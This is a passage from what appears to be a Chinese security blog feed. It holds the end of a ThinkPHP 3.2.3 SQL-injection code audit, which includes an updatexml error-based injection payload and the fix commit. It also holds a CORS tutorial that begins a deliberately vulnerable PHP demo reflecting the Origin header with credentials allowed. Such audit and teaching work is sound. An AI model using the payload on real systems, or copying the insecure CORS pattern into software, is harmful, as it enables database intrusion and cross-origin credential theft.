class="hljs-string">&#x27;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$sql</span> .=   <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseComment</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;comment&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;comment&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$sql</span>,!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;fetch_sql&#x27;</span>]) ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>parseWhere</code>会调用<code>parseWhereItem</code>（进入到elseif(‘bind’ == $exp )）</p><p>返回值如下</p><p><img src="/mdimg/thinkphp23/1745137301069-82f22914-2523-48a9-a485-344a56c4779b.png"></p><p>在<code>update()</code>的最后<code>return</code>会调用<code>ThinkPHP/Library/Think/Db/Driver.class.php:193</code> 的<code> execute()</code></p><p>继续跟进发现在198行</p><p><code>$this-&gt;queryStr = strtr($this-&gt;queryStr,array_map(function($val) use($that)&#123; return &#39;\&#39;&#39;.$that-&gt;escapeString($val).&#39;\&#39;&#39;; &#125;,$this-&gt;bind));</code></p><p>sql语句改变了</p><p><img src="/mdimg/thinkphp23/1745138117609-ffd3fb33-d878-4ca9-abd8-ca207b62ee1a.png">分析这行发现</p><p>把<code>queryStr</code>根据<code>$this-&gt;bind</code>数组进行替换</p><p><img src="/mdimg/thinkphp23/1745137322773-2553a6a3-f97a-48bc-9dd2-7362c997bc8a.png"></p><p>也就是把<code>:0</code>转为<code>1</code></p><p><img src="/mdimg/thinkphp23/1745137388750-df2a51b4-639f-4039-a398-69dcb892bd2d.png"></p><p>成功构造sql注入</p><p><img src="/mdimg/thinkphp23/1745137310850-d396f273-cf16-476c-9112-b8a6b020ca5d.png"></p><p>那么<code>bind</code>数组是哪来的，<code>bind</code>一开始是初始化的空数组，对<code>bind</code>监视，看值是何时变化的</p><p><img src="/mdimg/thinkphp23/1745137342764-168c90f7-ebdb-4f25-be9e-c9a8e8636f0c.png"></p><p>发现是<code>bindParam()</code>方法</p><p><code>protected function bindParam($name,$value)&#123; $this-&gt;bind[&#39;:&#39;.$name] = $value; &#125;// bind[:0] = 1</code></p><p>而<code>bindParam()</code>方法是<code>parseSet()</code>调用的，<code>parseSet()</code>是<code>update()</code>方法（895行）调用的</p><p>也就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">save</span>()--&gt; <span class="hljs-title function_ invoke__">update</span>()--&gt; <span class="hljs-title function_ invoke__">parseSet</span>() --&gt; <span class="hljs-title function_ invoke__">bindParam</span>() --&gt; <span class="hljs-title function_ invoke__">execute</span>()<br>然后<span class="hljs-title function_ invoke__">execute</span>()的<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;bind))&#123;<br>    <span class="hljs-variable">$that</span>   =   <span class="hljs-variable language_">$this</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;queryStr =   <span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-variable">$this</span>-&gt;queryStr,<span class="hljs-title function_ invoke__">array_map</span>(function(<span class="hljs-variable">$val</span>) <span class="hljs-keyword">use</span>(<span class="hljs-variable">$that</span>)&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span>.<span class="hljs-variable">$that</span>-&gt;<span class="hljs-title function_ invoke__">escapeString</span>(<span class="hljs-variable">$val</span>).<span class="hljs-string">&#x27;\&#x27;&#x27;</span>; &#125;,<span class="hljs-variable language_">$this</span>-&gt;bind));<br>&#125;  <span class="hljs-comment">//把sql语句的:0替换为1 </span><br></code></pre></td></tr></table></figure><p>替换的这个<code>1</code> 其实就是传入的<code>password</code>的值</p><p>改一下payload</p><p><code>?id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password=aa</code></p><p><img src="/mdimg/thinkphp23/1745137352542-ece86b6a-0746-4cc7-8ab3-474fc148e318.png"></p><p>发现bind把<code>:0</code>替换为<code>aa</code></p><h4 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a><strong>修复</strong></h4><p><a href="https://github.com/top-think/thinkphp/commit/7e47e34af72996497c90c20bcfa3b2e1cedd7fa4">https://github.com/top-think/thinkphp/commit/7e47e34af72996497c90c20bcfa3b2e1cedd7fa4</a></p><p><img src="/mdimg/thinkphp23/1745137326942-6d8b2521-f314-4d85-a6a9-003935ac8c5d.png"></p><p>在<code>I()</code>的回调方法<code>think_filter</code>增加一个<code>bind</code>字符过滤</p>]]></content>
    
    
    <categories>
      
      <category>研究</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>跨域漏洞</title>
    <link href="/2025/04/18/%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/04/18/%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="同源策略-SOP"><a href="#同源策略-SOP" class="headerlink" title="同源策略(SOP)"></a><strong>同源策略(SOP)</strong></h1><blockquote><p><strong>同源策略</strong>是一个重要的安全策略，它用于限制一个源的文档或者它加载的脚本如何能与另一个源的资源进行交互。</p></blockquote><p>同源即同端口，同主机，同协议</p><table><thead><tr><th>http</th><th>https</th><th>不同源</th><th>协议不同</th></tr></thead><tbody><tr><td><a href="http://a.com:8080/">http://a.com:8080</a></td><td><a href="http://a.com/">http://a.com:80</a></td><td>不同源</td><td>端口不同</td></tr><tr><td><a href="http://a.com/">http://a.com</a></td><td><a href="http://b.com/">http://b.com:80</a></td><td>不同源</td><td>主机不同</td></tr><tr><td><a href="http://a.com/">http://a.com:80</a></td><td><a href="http://a.a.com/">http://a.a.com:80</a></td><td>不同源</td><td>子域名需要设置才可同源</td></tr><tr><td><a href="http://a.com/a.html">http://a.com:80/a.html</a></td><td><a href="http://a.com/b.html">http://a.com:80/b.html</a></td><td>同源</td><td>仅文件不同</td></tr></tbody></table><h1 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a><strong>跨域</strong></h1><h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a><strong>CORS</strong></h2><blockquote><p><strong>跨源资源共享</strong>（<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CORS">CORS</a>，或通俗地译为跨域资源共享）是一种基于 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/HTTP">HTTP</a> 头的机制，该机制通过允许服务器标示除了它自己以外的其他<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Origin">源</a>（域、协议或端口），使得浏览器允许这些源访问加载自己的资源。跨源资源共享还通过一种机制来检查服务器是否会允许要发送的真实请求，该机制通过浏览器发起一个到服务器托管的跨源资源的“预检”请求。在预检中，浏览器发送的头中标示有 HTTP 方法和真实请求中会用到的头。</p></blockquote><h3 id="预检请求"><a href="#预检请求" class="headerlink" title="预检请求"></a><strong>预检请求</strong></h3><blockquote><p>开启CORS时，对于一些不是简单请求的（如自定义header，不常用的Content-Type 等等），浏览器必须首先使用 OPTIONS 方法发起一个预检请求，从而获知服务端是否允许该跨源请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（例如 Cookie 和 HTTP 认证相关数据）。</p></blockquote><p>一个demo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fetchPromise = <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;https://bar.other/doc&quot;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>  <span class="hljs-attr">mode</span>: <span class="hljs-string">&quot;cors&quot;</span>,<br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;text/xml&quot;</span>,<br>    <span class="hljs-string">&quot;X-PINGOTHER&quot;</span>: <span class="hljs-string">&quot;pingpong&quot;</span>,<br>  &#125;,<br>  <span class="hljs-attr">body</span>: <span class="hljs-string">&quot;&lt;person&gt;&lt;name&gt;Arun&lt;/name&gt;&lt;/person&gt;&quot;</span>,<br>&#125;);<br><br>fetchPromise.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response.<span class="hljs-property">status</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>在header</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;text/xml&quot;</span>,<br>    <span class="hljs-string">&quot;X-PINGOTHER&quot;</span>: <span class="hljs-string">&quot;pingpong&quot;</span>,<br>  &#125;<br></code></pre></td></tr></table></figure><p>均不符合简单请求，需要预检请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">OPTIONS</span> /doc <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: bar.<span class="hljs-property">other</span><br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Macintosh</span>; <span class="hljs-title class_">Intel</span> <span class="hljs-title class_">Mac</span> <span class="hljs-variable constant_">OS</span> X <span class="hljs-number">10.14</span>; <span class="hljs-attr">rv</span>:<span class="hljs-number">71.0</span>) <span class="hljs-title class_">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-title class_">Firefox</span>/<span class="hljs-number">71.0</span><br><span class="hljs-title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: en-us,en;q=0.5</span><br><span class="hljs-comment">Accept-Encoding: gzip,deflate</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Origin: https://foo.example</span><br><span class="hljs-comment">Access-Control-Request-Method: POST  //告知服务器，实际请求将使用 POST 方法</span><br><span class="hljs-comment">Access-Control-Request-Headers: X-PINGOTHER, Content-Type  //告知服务器，实际请求将携带两个自定义请求标头字段</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">HTTP/1.1 204 No Content</span><br><span class="hljs-comment">Date: Mon, 01 Dec 2008 01:15:39 GMT</span><br><span class="hljs-comment">Server: Apache/2</span><br><span class="hljs-comment">Access-Control-Allow-Origin: https://foo.example  //限制请求的源域</span><br><span class="hljs-comment">Access-Control-Allow-Methods: POST, GET, OPTIONS  //明服务器允许客户端使用 POST 和 GET 方法发起请求</span><br><span class="hljs-comment">Access-Control-Allow-Headers: X-PINGOTHER, Content-Type  //表明服务器允许请求中携带字段</span><br><span class="hljs-comment">Access-Control-Max-Age: 86400  //该预检请求可供缓存的时间长短</span><br><span class="hljs-comment">Vary: Accept-Encoding, Origin</span><br><span class="hljs-comment">Keep-Alive: timeout=2, max=100</span><br><span class="hljs-comment">Connection: Keep-Alive</span><br></code></pre></td></tr></table></figure><p>预检请求完成之后，会发送实际请求</p><p>流程图</p><p><img src="/mdimg/cors/1744981713856-e071169a-9a8d-4b7f-be81-99d43074a544.png"></p><h3 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a><strong>简单请求</strong></h3><p>若请求<strong>满足所有下述条件</strong>，则该请求可视为简单请求，简单请求不会触发预检</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">请求方法：<span class="hljs-variable constant_">GET</span> <span class="hljs-variable constant_">POST</span> <span class="hljs-variable constant_">HEAD</span><br><br>运行设置的header：<br><span class="hljs-title class_">Accept</span><br><span class="hljs-title class_">Accept</span>-<span class="hljs-title class_">Language</span><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Language</span><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span><br><span class="hljs-title class_">Range</span>简单的范围标头值 如 bytes=<span class="hljs-number">256</span>- 或 bytes=<span class="hljs-number">127</span>-<span class="hljs-number">255</span>）<br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span> 标头所指定的媒体类型的值仅限于下列三者之一：<br>text/plain<br>multipart/form-data<br>application/x-www-form-urlencoded<br><br><span class="hljs-title class_">XMLHttpRequest</span>对象发出的请求·，在返回的 <span class="hljs-title class_">XMLHttpRequest</span>.<span class="hljs-property">upload</span> 对象属性上没有注册任何事件监听器；<br>也就是说，给定一个 <span class="hljs-title class_">XMLHttpRequest</span> 实例 xhr，没有调用 xhr.<span class="hljs-property">upload</span>.<span class="hljs-title function_">addEventListener</span>()，以监听该上传请求。<br><br>请求中没有使用<span class="hljs-title class_">ReadableStream</span> 对象。<br></code></pre></td></tr></table></figure><h3 id="附带身份凭证的请求"><a href="#附带身份凭证的请求" class="headerlink" title="附带身份凭证的请求"></a><strong>附带身份凭证的请求</strong></h3><p><code>当响应的是附带身份凭证的请求时，服务端必须明确 Access-Control-Allow-Origin 的值，而不能使用通配符“*”，不然浏览器会报错</code></p><p>一个demo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> url = <span class="hljs-string">&quot;https://bar.other/resources/credentialed-content/&quot;</span>;<br><br><span class="hljs-keyword">const</span> request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>(url, &#123; <span class="hljs-attr">credentials</span>: <span class="hljs-string">&quot;include&quot;</span> &#125;);  <span class="hljs-comment">//附带cookies</span><br><br><span class="hljs-keyword">const</span> fetchPromise = <span class="hljs-title function_">fetch</span>(request);<br>fetchPromise.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response));<br></code></pre></td></tr></table></figure><p>浏览器会拒绝任何不带<code>Access-Control-Allow-Credentials: true</code>标头的响应，且不会把响应提供给调用的网页内容。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">GET</span> /resources/credentialed-content/ <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: bar.<span class="hljs-property">other</span><br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Macintosh</span>; <span class="hljs-title class_">Intel</span> <span class="hljs-title class_">Mac</span> <span class="hljs-variable constant_">OS</span> X <span class="hljs-number">10.14</span>; <span class="hljs-attr">rv</span>:<span class="hljs-number">71.0</span>) <span class="hljs-title class_">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-title class_">Firefox</span>/<span class="hljs-number">71.0</span><br><span class="hljs-title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: en-us,en;q=0.5</span><br><span class="hljs-comment">Accept-Encoding: gzip,deflate</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Referer: https://foo.example/examples/credential.html</span><br><span class="hljs-comment">Origin: https://foo.example</span><br><span class="hljs-comment">Cookie: pageAccess=2</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">HTTP/1.1 200 OK</span><br><span class="hljs-comment">Date: Mon, 01 Dec 2008 01:34:52 GMT</span><br><span class="hljs-comment">Server: Apache/2</span><br><span class="hljs-comment">Access-Control-Allow-Origin: https://foo.example  //设置源域</span><br><span class="hljs-comment">Access-Control-Allow-Credentials: true  //表示允许携带cookies</span><br><span class="hljs-comment">Cache-Control: no-cache</span><br><span class="hljs-comment">Pragma: no-cache</span><br><span class="hljs-comment">Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT</span><br><span class="hljs-comment">Vary: Accept-Encoding, Origin</span><br><span class="hljs-comment">Content-Encoding: gzip</span><br><span class="hljs-comment">Content-Length: 106</span><br><span class="hljs-comment">Keep-Alive: timeout=2, max=100</span><br><span class="hljs-comment">Connection: Keep-Alive</span><br><span class="hljs-comment">Content-Type: text/plain</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">[text/plain payload]</span><br></code></pre></td></tr></table></figure><p>在响应附带身份凭证的请求时：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器不能将 <span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span> 的值设为通配符“*”，而应将其设置为特定的域，如：<span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span>: <span class="hljs-attr">https</span>:<span class="hljs-comment">//example.com。</span><br>服务器不能将 <span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Headers</span> 的值设为通配符“*”，而应将其设置为标头名称的列表，如：<span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Headers</span>: X-<span class="hljs-variable constant_">PINGOTHER</span>, <span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span><br>服务器不能将 <span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Methods</span> 的值设为通配符“*”，而应将其设置为特定请求方法名称的列表，如：<span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Methods</span>: <span class="hljs-variable constant_">POST</span>, <span class="hljs-variable constant_">GET</span><br></code></pre></td></tr></table></figure><h3 id="CORS的响应header"><a href="#CORS的响应header" class="headerlink" title="CORS的响应header"></a><strong>CORS的响应header</strong></h3><h4 id="Access-Control-Allow-Origin"><a href="#Access-Control-Allow-Origin" class="headerlink" title="Access-Control-Allow-Origin"></a><strong>Access-Control-Allow-Origin</strong></h4><p>告诉浏览器允许该源访问资源</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span>: example.<span class="hljs-property">com</span>   <span class="hljs-comment">//只允许example.com</span><br><span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span>: *             <span class="hljs-comment">//配符*，表示允许来自任意源的请求</span><br><span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span>: <span class="hljs-literal">null</span>          <span class="hljs-comment">//只有来源为 null 的请求才能访问资源</span><br><span class="hljs-literal">null</span>来源通常出现在以下场景：<br>请求来自本地文件（如 <span class="hljs-attr">file</span>:<span class="hljs-comment">// 协议打开的 HTML 文件）。</span><br>请求是由沙盒化的iframe 或某些特殊环境（如浏览器扩展）发起的。<br>请求是通过<span class="hljs-attr">data</span>: <span class="hljs-variable constant_">URL</span>、<span class="hljs-attr">about</span>:blank 或重定向生成的。<br></code></pre></td></tr></table></figure><h4 id="Access-Control-Expose-Headers"><a href="#Access-Control-Expose-Headers" class="headerlink" title="Access-Control-Expose-Headers"></a><strong>Access-Control-Expose-Headers</strong></h4><p>要访问其他头（一些最基本的响应头外），则需要服务器设置本响应头。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Expose</span>-<span class="hljs-title class_">Headers</span>: &lt;header-name&gt;[, &lt;header-name&gt;]*<br></code></pre></td></tr></table></figure><h4 id="Access-Control-Allow-Credentials"><a href="#Access-Control-Allow-Credentials" class="headerlink" title="Access-Control-Allow-Credentials"></a><strong>Access-Control-Allow-Credentials</strong></h4><p>指定了当浏览器的 <code>credentials </code>设置为 true 时是否允许浏览器读取 response 的内容。当用在对 preflight 预检测请求的响应中时，它指定了实际的请求是否可以使用 </p><p><code>credentials</code>。请注意：简单 GET 请求不会被预检；如果对此类请求的响应中不包含该字段，这个响应将被忽略掉，并且浏览器也不会将相应内容返回给网页</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Credentials</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">//表示请求附带cookie等凭证时，允许响应被浏览器读取</span><br></code></pre></td></tr></table></figure><h3 id="CORS漏洞"><a href="#CORS漏洞" class="headerlink" title="CORS漏洞"></a><strong>CORS漏洞</strong></h3><p>在实际的CORS漏洞利用里面，因为需运行恶意的Javascript脚本，主要配合xss、CSRF或者钓鱼利用。换句话说，CORS漏洞是在xss和钓鱼中遇到同源策略，但是CORS错误配置产生的漏洞，进而可以绕过同源策略来窃取数据或者CSRF。</p><h4 id="Access-Control-Allow-Origin-动态"><a href="#Access-Control-Allow-Origin-动态" class="headerlink" title="Access-Control-Allow-Origin:动态"></a><strong>Access-Control-Allow-Origin:动态</strong></h4><p>存在漏洞的响应</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span>: 动态  <span class="hljs-comment">//根据请求的源来设置，比如是a请求资源那就设置为a，b请求则设置为b</span><br><span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Credentials</span>: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>此时不管什么源请求都可以，并且可以获取携带cookie等凭证的请求的响应。</p><p>测试漏洞demo，部署在本地phpstudy，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-variable">$user</span> = [<br>  <span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-number">1</span>,<br>  <span class="hljs-string">&#x27;name&#x27;</span> =&gt; <span class="hljs-string">&#x27;admin&#x27;</span>,<br>  <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-string">&#x27;password&#x27;</span><br>  ];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>  &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;login&#x27;</span>)&#123;<br>  <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>  <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>  <span class="hljs-variable">$origin</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_ORIGIN&#x27;</span>];<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin:&#x27;</span>.<span class="hljs-variable">$origin</span>);   <span class="hljs-comment">//动态设置源</span><br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Credentials: true&#x27;</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;name&#x27;</span>] &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;<br>    <span class="hljs-comment">//        setcookie(&#x27;user&#x27;,$username, [</span><br>    <span class="hljs-comment">//            &#x27;expires&#x27; =&gt; time() + 3600,</span><br>    <span class="hljs-comment">//            &#x27;path&#x27; =&gt; &#x27;/&#x27;,</span><br>    <span class="hljs-comment">//            &#x27;domain&#x27; =&gt; &#x27;localhost&#x27;,</span><br>    <span class="hljs-comment">//            &#x27;secure&#x27; =&gt; false,</span><br>    <span class="hljs-comment">//            &#x27;httponly&#x27; =&gt; false,</span><br>    <span class="hljs-comment">//            &#x27;samesite&#x27; =&gt; &#x27;None&#x27;</span><br>    <span class="hljs-comment">//        ]);</span><br><br>    <span class="hljs-title function_ invoke__">session_set_cookie_params</span>([<br>                              <span class="hljs-string">&#x27;lifetime&#x27;</span> =&gt; <span class="hljs-number">3600</span>,<br>                              <span 